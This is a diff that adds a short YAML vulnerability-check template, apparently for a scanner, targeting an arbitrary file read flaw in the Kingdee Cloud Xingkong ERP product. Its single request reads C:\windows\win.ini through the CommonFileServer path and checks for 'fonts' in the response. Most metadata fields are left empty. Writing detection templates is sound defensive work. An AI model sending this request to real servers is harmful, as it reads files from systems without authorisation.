@@ -1,0 +1,16 @@
+id:
+
+info:
+  name: 金蝶云星空 CommonFileServer任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /CommonFileServer/c%3A%2Fwindows%2Fwin.ini
+response1:
+  body: fonts
+  code: 200
+requests2:
+response2:
